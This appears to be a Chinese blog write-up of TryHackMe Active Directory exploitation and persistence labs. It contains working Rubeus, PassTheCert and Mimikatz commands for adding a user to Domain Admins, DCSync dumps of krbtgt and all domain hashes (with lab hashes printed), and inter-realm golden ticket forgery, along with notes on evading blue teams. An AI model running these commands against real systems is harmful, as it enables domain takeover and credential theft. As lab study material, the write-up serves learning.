<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">Rubeus.exe </span><span style="color: #E06C75">asktgt</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">Administrator</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">enctype</span><span style="color: #ABB2BF">:</span><span style="color: #E06C75">aes256</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">certificate</span><span style="color: #ABB2BF">:ABC.</span><span style="color: #E06C75">pfx</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">password</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">outfile</span><span style="color: #ABB2BF">:tgt.</span><span style="color: #E06C75">tgt</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">domain</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">loc</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">dc</span><span style="color: #ABB2BF">:thmdc.za.tryhackme.loc</span></span>
<span class="line"><span style="color: #ABB2BF"># 这里碰到了报错</span></span>
<span class="line"><span style="color: #ABB2BF">[X] </span><span style="color: #E06C75">KRB</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">ERROR</span><span style="color: #ABB2BF"> (</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">) : KDC_ERR_PADATA_TYPE_NOSUPP</span></span></code></pre></div></div></figure>

<p>报错 <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> 表明，域控制器<strong>不支持</strong>你使用的证书类型进行 <strong>PKINIT 认证</strong>。这可能是因为域控没有正确配置，或者你的工具和域控的协议版本不兼容。我们转成 LDAP 认证，LDAP 认证也支持使用证书，它将证书作为身份凭证来修改目录服务。</p>
<p>做到这一块其实我卡了一个小时作用，这个方法是从 Discord 频道里面找到的，看来 AD 这块我的认知还是太少了。</p>
<h4 id="使用-LDAP-进行认证"><a href="#使用-LDAP-进行认证" class="headerlink" title="使用 LDAP 进行认证"></a>使用 LDAP 进行认证</h4><p>从<a target="_blank" rel="noopener" href="https://github.com/The-Viper-One/Invoke-PassTheCert">这里</a>下载 PassTheCert PowerShell 脚本。我没有加载这个 TGT，而是把我的用户加进 DOMAIN ADMINS 组，这个组对域内的所有机器都有权限，也包括 THMDC 这台机器。</p>
<img src="/thm_ad/image-20250807052300452.png" class="" title="image-20250807052300452">

<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用点源载入脚本</span></span>
<span class="line"><span style="color: #ABB2BF">. .</span><span style="color: #56B6C2">/Invoke-PassTheCert.ps1</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 利用证书的权限执行 whoami</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Whoami</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 把自己的用户加进 DOMAIN ADMINS 组</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AddToGroup </span><span style="color: #98C379">&quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupDN </span><span style="color: #98C379">&quot;CN=DOMAIN ADMINS,CN=USERS,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># SSH 连进去</span></span>
<span class="line"><span style="color: #ABB2BF">ssh barbara.reid</span><span style="color: #E06C75">@thmdc.za.tryhackme.loc</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span>
<span class="line"><span style="color: #ABB2BF">type C:\Users\Administrator\Desktop\flag5.txt</span></span></code></pre></div></div></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/schannel/passthecert">https://www.thehacker.recipes/ad/movement/schannel/passthecert</a></p>
<h2 id="Exploiting-Domain-Trusts"><a href="#Exploiting-Domain-Trusts" class="headerlink" title="Exploiting Domain Trusts"></a>Exploiting Domain Trusts</h2><p><strong>域信任</strong>是一种机制，允许网络中的用户访问本域之外的资源。它定义了林内部不同域之间的通信方式，在某些特殊情况下，信任也可以扩展到外部域或整个林。</p>
<p>域之间主要有两种信任类型：</p>
<ul>
<li><strong>方向性</strong>：信任的方向是从**信任域（Trusting Domain）**流向**受信域（Trusted Domain）**。</li>
<li><strong>传递性</strong>：信任关系不限于两个域之间，而是可以<strong>传递</strong>到其他被信任的域。</li>
</ul>
<p>在一个林中，通常会有一个根域或父域，比如我们的 <strong>TRYHACKME.LOC</strong>。为了方便管理，会为各个地区办事处创建子域，如 <strong>ZA.TRYHACKME.LOC</strong> 和 <strong>UK.TRYHACKME.LOC</strong>。</p>
<p>这种林配置使得 ZA 和 UK 办事处可以共享资源。举个例子，如果 UK 办事处的一个用户需要访问 <strong>THMSERVER1</strong>，我们可以授权该用户访问 ZA 域内的资源。这之所以可行，是因为 ZA 和根域、UK 和根域之间都存在<strong>双向信任</strong>，从而在 ZA 和 UK 之间建立了<strong>可传递的信任关系</strong>。</p>
<p>父域和子域之间的双向信任是 <strong>Active Directory 的预期行为</strong>，它的目的是通过可传递的信任关系来简化资源共享。</p>
<p>然而，作为攻击者，我们也可以利用这个信任关系。如果我们成功<strong>攻陷了子域</strong>，就可以滥用子域对父域的信任，进一步<strong>入侵父域</strong>。</p>
<h3 id="KRBTGT-and-Golden-Tickets"><a href="#KRBTGT-and-Golden-Tickets" class="headerlink" title="KRBTGT and Golden Tickets"></a>KRBTGT and Golden Tickets</h3><p><strong>KRBTGT</strong> 是微软实现 <strong>Kerberos 认证</strong>协议的核心账户。它的名字来自 Kerberos（KRB）和票据授权票据（TGT）。</p>
<p>这个账户本质上就是 Kerberos 分发中心（KDC）服务的“身份”，而 KDC 负责处理所有的 Kerberos 票据请求。KRBTGT 账户的密码哈希被用来<strong>加密和签名域内的所有 Kerberos 票据</strong>。由于所有域控制器都共享这个哈希，当用户请求访问资源时，域控制器就能用它来验证收到的 TGT 是否真实有效。</p>
<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>那么，如果我们想要自己生成 TGT，从而获得对所有资源的访问权限，该怎么办呢？这就是著名的<strong>黄金票据攻击（Golden Ticket attack）</strong>。</p>
<p>在黄金票据攻击中，我们完全绕过 KDC，自己创建 TGT，<strong>摇身一变成为一个临时的票据授权服务器（TGS）</strong>。</p>
<p>要伪造 TGT，我们需要收集以下四样关键信息：</p>
<ol>
<li>域的 FQDN（完全限定域名）</li>
<li>域的安全标识符（SID）</li>
<li>我们想要冒充的用户名</li>
<li><strong>KRBTGT 账户的密码哈希</strong></li>
</ol>
<p>前三项通常比较容易获取。但最后一项 <strong>KRBTGT 的密码哈希</strong>，只存储在域控制器上，因此需要我们先攻陷域才能拿到。</p>
<h4 id="dcysnc-攻击"><a href="#dcysnc-攻击" class="headerlink" title="dcysnc 攻击"></a>dcysnc 攻击</h4><p><code>dcsync</code> 是一种常见的攻击技术，它利用了 Active Directory（AD）域控制器之间用于同步数据的<strong>复制协议</strong>。攻击者通过冒充一台域控制器，向另一台域控制器请求复制指定用户的凭据，从而窃取密码哈希。</p>
<p>正常情况下，当一个域控制器上的用户账户发生变化时（比如修改了密码），它会通过一个称为 Directory Replication Service (DRS) Remote Protocol 的协议，通知其他域控制器进行数据同步。</p>
<p><code>dcsync</code> 攻击正是滥用了这个正常且必要的功能。攻击者在拥有特定高权限账户（通常是域管理员）后，会执行 <code>dcsync</code> 命令，伪装成一个合法的域控制器，并向目标域控制器发送一个数据复制请求。目标域控制器会误以为这是一次正常的同步，并将请求用户的密码哈希发送给攻击者的机器。</p>
<p>接下来，我们将再次使用 <strong>Mimikatz</strong>，通过 <code>dcsync</code> 攻击在 <strong>THMSERVER2</strong> 上拿到 KRBTGT 的密码 hash。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 让我的用户有 DSSync 权限</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-PassTheCert</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server </span><span style="color: #98C379">&quot;thmdc.za.tryhackme.loc&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Certificate </span><span style="color: #98C379">&quot;c:/tools/ABC.pfx&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CertificatePassword </span><span style="color: #98C379">&quot;1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Elevate </span><span style="color: #98C379">&quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行 mimikatz</span></span>
<span class="line"><span style="color: #ABB2BF">mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 模拟一台域控制器，请求域内的另一台域控制器将 krbtgt 用户的凭据信息复制给我</span></span>
<span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:za\krbtgt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">Credentials:</span></span>
<span class="line"><span style="color: #ABB2BF">  Hash NTLM: 16f9af38fca3ada405386b3b57366082</span></span>
<span class="line"><span style="color: #ABB2BF">    ntlm</span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">: 16f9af38fca3ada405386b3b57366082</span></span>
<span class="line"><span style="color: #ABB2BF">    lm  </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">: 35c7b671efe40860dc078afd2786c902</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># RDP 连上 THMDC</span></span>
<span class="line"><span style="color: #ABB2BF">xfreerdp3 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">v:thmdc.za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">d:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">u:barbara.reid </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">p:Password1 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">timeout:</span><span style="color: #D19A66">60000</span></span></code></pre></div></div></figure>

<h3 id="Inter-Realm-TGTs"><a href="#Inter-Realm-TGTs" class="headerlink" title="Inter-Realm TGTs"></a>Inter-Realm TGTs</h3><p>我们现在拥有了 KRBTGT 账户的密码哈希，这使我们可以在子域中伪造黄金票据来访问任何资源。更进一步，我们可以伪造一种叫做**跨域 TGT（Inter-Realm TGT）**的票据。这种票据专门用于访问其他域的资源。</p>
<p>我们的目标是利用子域和父域之间的双向信任关系，来获取对父域的完全访问权限。</p>
<p>在伪造黄金票据时，我们将在票据中加入来自其他域的额外账户 SID，以此来执行攻击。<code>Mimikatz</code> 工具可以帮助我们实现这一点，它允许我们在 Kerberos TGT 的 <code>KERB_VALIDATION_INFO</code> 结构中设置 <code>ExtraSids</code> 部分。<code>ExtraSids</code> 被描述为“一个指向 <code>KERB_SID_AND_ATTRIBUTES</code> 结构的指针列表，其中包含的 SID 对应于主体所属账户域之外的其他域中的组”。</p>
<p>这里的关键是，我们将利用父域对我们子域的信任。具体做法是，在为子域的域控制器伪造票据时，我们将 <strong>父域中的“Enterprise Admins (EA)”组的 SID</strong> 作为额外 SID 添加到票据中。EA 组属于父域，其成员资格实际上赋予了对整个林的管理员权限！这个组的默认 SID 是 <code>S-1-5-21-&lt;RootDomain&gt;-519</code>。</p>
<p>在进行攻击之前，我们首先需要获取两个 SID：</p>
<ol>
<li><strong>子域域控制器（THMDC）的 SID</strong>，这是我们将在伪造的 TGT 中冒充的对象。</li>
<li><strong>父域中 Enterprise Admins 组的 SID</strong>，这是我们将作为额外 SID 添加到伪造 TGT 中的 SID。</li>
</ol>
<p>为了获取这两个 SID，我们可以使用 <code>AD-RSAT</code> PowerShell 命令。我们可以使用以下命令来获取子域域控制器的 SID：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 找到子域控的 SID</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADComputer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;THMDC&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># S-1-5-21-3885271727-2693558621-2658995185-1001</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 找到父域 Enterprise Admins 组的 SID</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Enterprise Admins&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Server thmrootdc.tryhackme.loc</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># S-1-5-21-3330634377-1326264276-632209373-519</span></span></code></pre></div></div></figure>

<h4 id="滥用域信任"><a href="#滥用域信任" class="headerlink" title="滥用域信任"></a>滥用域信任</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 伪造 Inter-Realm 金票</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这里的 sids 就是上面父域中找到的那个组的 SID</span></span>
<span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1001</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:krbtgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">rc4:16f9af38fca3ada405386b3b57366082 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sids:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3330634377</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1326264276</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">632209373</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">519</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 拿 Flag</span></span>
<span class="line"><span style="color: #ABB2BF">type \\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt</span></span></code></pre></div></div></figure>

<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>我个人觉得还是因为 AD 的复杂性导致这么多的权限问题，小权限用户可以加组，然后那个组可以改管理员的密码？这个在一开始不应该警告用户吗？</p>
<p>再到 Kerberos 委派可以<strong>不经过用户同意</strong>去以他的身份申请证书（WTF？？）。然后就是利用打印机服务可以远程让一个机器去请求另外一个机器（SSRF？），最难崩的还是通信过程不强制加密，直接给拦咯。</p>
<p>后面那个密码记录和 GPO 修改就感觉挺正常的，不算设计上的问题。到后面那个证书就纯纯的是用户的锅了，感觉又不全是，微软得背一半。按理说这种可以伪造 SAN 的证书就应该保留一个原始的名字，而且对于这种敏感权限的调用，这种证书就应该默认拒绝。</p>
<p>金票更是难绷，整个认证就靠一个 Hash？？当时听别人说金票银票挺高级的，结果就这？dcsync 一个同步能把用户的 Hash 同步过来，就不知道说什么了。跨域信任就挺正常，算是正常利用吧。</p>
<p>总之这个房间让我学到了超级多 AD 的问题和利用点，感觉 AD 这种安全性是 M$ 的人一拍脑子想下来到的东西，可能也和屎山有关系，最主要的我还是觉得是那个 Hash 问题很大很大。</p>
<p>在管理方来看，这种设计问题就挺难避免的，在增加类似权限的时候，我觉得可以增加一些检查机制，来揭示出这种攻击路径，或许已经有类似安全工具可以检查了。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html">Silver Ticket Attack</a></li>
<li><a target="_blank" rel="noopener" href="https://www.netwrix.com/how_golden_ticket_attack_works.html">Golden Ticket Attack</a></li>
<li><a target="_blank" rel="noopener" href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Kerberoasting Attack</a></li>
<li><a target="_blank" rel="noopener" href="https://www.netwrix.com/ntds_dit_security_active_directory.html?cID=70170000000kgEZ">NTDS.dit Password Extraction</a></li>
<li><a target="_blank" rel="noopener" href="https://www.netwrix.com/privilege_escalation_using_mimikatz_dcsync.html?cID=70170000000kgEZ">DCSync Attack Using Mimikatz Detection</a></li>
</ul>
<hr>
<h1 id="Persisting-Active-Directory"><a href="#Persisting-Active-Directory" class="headerlink" title="Persisting Active Directory"></a>Persisting Active Directory</h1><p>irene.leach</p>
<p>Password1</p>
<h2 id="Persistence-through-Credentials"><a href="#Persistence-through-Credentials" class="headerlink" title="Persistence through Credentials"></a>Persistence through Credentials</h2><p>这一节讲了利用 dcsync 把密码的 hash 全部 dump 出来，然后离线爆破</p>
<h3 id="域同步（DC-Sync）"><a href="#域同步（DC-Sync）" class="headerlink" title="域同步（DC Sync）"></a>域同步（DC Sync）</h3><p>大型组织中，为了保证认证服务的响应速度，一个域通常会部署多个域控制器（DC）。为了让所有 DC 的数据保持一致，它们会通过**域复制（Domain Replication）**机制来同步信息。</p>
<p>每个 DC 都会运行一个名为 <strong>KCC</strong> 的进程，它会建立一个复制拓扑，并通过 <strong>RPC</strong> 与其他 DC 同步用户密码、新账户等信息。这就是为什么更改密码后，有时需要等待几分钟才能在新地点登录，因为你登录的 DC 可能还没来得及同步最新的密码。</p>
<p>这个同步过程也称为 <strong>DC 同步（DC Synchronisation）</strong>。除了 DC 自己，拥有域管理员权限的账户也可以为了合法目的发起这个同步。</p>
<p>如果攻击者获取了拥有域复制权限的账户，就可以执行 <strong><code>DC Sync</code> 攻击</strong>，冒充 DC 来从另一个 DC 窃取凭据。</p>
<h3 id="凭据并非都一样"><a href="#凭据并非都一样" class="headerlink" title="凭据并非都一样"></a>凭据并非都一样</h3><p>在 <code>DC Sync</code> 攻击中，选择要窃取的凭据非常关键。虽然域管理员凭据权限最高，但蓝队一旦发现入侵，会最先重置这类账户的密码，导致你可能很快失去访问权限。</p>
<p>所以，更聪明的做法是获取<strong>接近高权限但又不易被察觉的凭据</strong>，以此实现<strong>持久化访问</strong>。这些凭据类型包括：</p>
<ul>
<li><strong>多台机器的本地管理员账户</strong>：通常有专门的组拥有对大量计算机的本地管理员权限。窃取这些账户的凭据，可以让你保持对大部分机器的访问。</li>
<li><strong>拥有委派权限的服务账户</strong>：利用这类账户可以发动 Kerberos 委派攻击，例如<strong>黄金票据</strong>和<strong>白银票据</strong>。</li>
<li><strong>特权 AD 服务账户</strong>：例如 Exchange、WSUS 或 SCCM 的账户。攻陷这些账户可以作为跳板，再次获得高权限。</li>
</ul>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 试验同步一个账户</span></span>
<span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:irene.leach</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启用记录功能</span></span>
<span class="line"><span style="color: #ABB2BF">log recopec_dcdump.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 通过同步提取所有用户的信息</span></span>
<span class="line"><span style="color: #ABB2BF">lsadump::dcsync </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">all</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 筛选文件</span></span>
<span class="line"><span style="color: #ABB2BF">cat &lt;username&gt;_dcdump.txt | grep </span><span style="color: #98C379">&quot;SAM Username&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">cat recopec_dcdump.txt | grep </span><span style="color: #98C379">&quot;Hash NTLM&quot;</span></span></code></pre></div></div></figure>

<h2 id="Persistence-through-Tickets"><a href="#Persistence-through-Tickets" class="headerlink" title="Persistence through Tickets"></a>Persistence through Tickets</h2><h3 id="Kerberos-认证基础"><a href="#Kerberos-认证基础" class="headerlink" title="Kerberos 认证基础"></a>Kerberos 认证基础</h3><p>Kerberos 认证的核心在于 **TGT（票据授权票据）**和 <strong>TGS（票据授权服务）</strong>。</p>
<ul>
<li><strong>TGT 请求</strong>：用户向域控制器（DC）发送一个包含用其 <strong>NTLM 哈希</strong>加密的时间戳的 <code>AS-REQ</code> 请求，以此来获取 TGT。DC 验证后，颁发一个用 <strong>KRBTGT</strong> 账户密码哈希签名的 TGT。</li>
<li><strong>TGS 请求</strong>：用户将 TGT 发送给 DC，请求访问特定资源的 <strong>TGS</strong>。如果 TGT 有效，DC 会颁发一个用该服务账户的 <strong>NTLM 哈希</strong>加密的 TGS。</li>
<li><strong>访问资源</strong>：用户将 TGS 提交给目标服务，服务验证后授予访问权限。</li>
</ul>
<hr>
<h3 id="黄金票据（Golden-Tickets）"><a href="#黄金票据（Golden-Tickets）" class="headerlink" title="黄金票据（Golden Tickets）"></a>黄金票据（Golden Tickets）</h3><p>黄金票据是<strong>伪造的 TGT</strong>。通过这种攻击，我们完全绕过了向 DC 证明身份的步骤。有了伪造的、拥有高权限账户的 TGT，我们就可以请求访问任何我们想要的服务。</p>
<p><strong>必要信息</strong>：要伪造黄金票据，攻击者需要四样东西：</p>
<ul>
<li><strong>KRBTGT 账户的密码哈希</strong></li>
<li>域的完全限定域名 (FQDN)</li>
<li>域的安全标识符 (SID)</li>
<li>要冒充的用户的 ID</li>
</ul>
<p><strong>攻击要点：</strong></p>
<ul>
<li><strong>核心需求</strong>：为了伪造黄金票据，我们必须拥有 <strong>KRBTGT 账户的密码哈希</strong>，因为它是所有 TGT 的签名者。</li>
<li><strong>绕过认证</strong>：我们不需要知道被冒充用户的密码哈希。只要票据由 KRBTGT 哈希签名，DC 就会无条件信任它。</li>
<li><strong>持久化</strong>：<ul>
<li>票据中的用户账户即使被禁用或删除，只要票据生成时间在 20 分钟内，依然有效。</li>
<li>我们可以修改票据的有效期，比如从 10 小时延长到 10 年，以此获得<strong>持久化访问</strong>。</li>
<li>KRBTGT 账户的密码默认不更改，一旦获取，除非手动重置两次（重置掉当前密码和历史密码，为了保持服务可用性），否则我们可以永久使用。</li>
<li>轮换 KRBTGT 账户的密码对蓝队来说是一个痛苦的过程，有些服务不会自己拉取新的 TGT，导致宕机。</li>
</ul>
</li>
<li><strong>隐蔽性</strong>：黄金票据可以在任何机器上生成，甚至是未加入域的机器，这使得攻击更难被发现。</li>
<li><strong>高权限</strong>：黄金票据甚至可以绕过智能卡认证，并且提供对域内所有资源的完全控制。</li>
</ul>
<hr>
<h3 id="白银票据（Silver-Tickets）"><a href="#白银票据（Silver-Tickets）" class="headerlink" title="白银票据（Silver Tickets）"></a>白银票据（Silver Tickets）</h3><p>白银票据是<strong>伪造的 TGS</strong>。与黄金票据不同，我们跳过了与 KDC 的所有通信，直接与我们想要访问的服务进行交互。</p>
<p>要伪造一张白银票据，你需要以下四样关键信息：</p>
<ol>
<li><strong>目标服务账户的 NTLM 哈希</strong>：这是最核心的，因为这个哈希是用来加密和签名票据的“密钥”。通常，这个哈希是目标服务器的<strong>机器账户哈希</strong>（例如 <code>THMSERVER1$</code>）。</li>
<li><strong>域的安全标识符 (SID)</strong>：用于标识票据所属的域。</li>
<li><strong>要冒充的用户的 ID</strong>：票据中会包含你想要伪装的用户名，比如 <code>Administrator</code>。</li>
<li><strong>目标服务帐户的 SPN (Service Principal Name)</strong>：这是服务的唯一标识，格式为 <code>&lt;服务类型&gt;/&lt;主机名&gt;</code>，比如 <code>cifs/thmserv1.za.tryhackme.loc</code>。</li>
</ol>
<p><strong>攻击要点：</strong></p>
<ul>
<li><strong>核心需求</strong>：为了伪造白银票据，我们需要目标服务器机器账户的密码哈希。</li>
<li><strong>范围有限</strong>：白银票据的权限范围仅限于<strong>特定服务器上的特定服务</strong>。相比黄金票据的完全控制，它的权限范围要小得多。</li>
<li><strong>极高隐蔽性</strong>：由于攻击绕过了 DC，没有 TGT 的生成记录，所以<strong>唯一的日志只存在于被攻击的服务器上</strong>，使得蓝队很难察觉。</li>
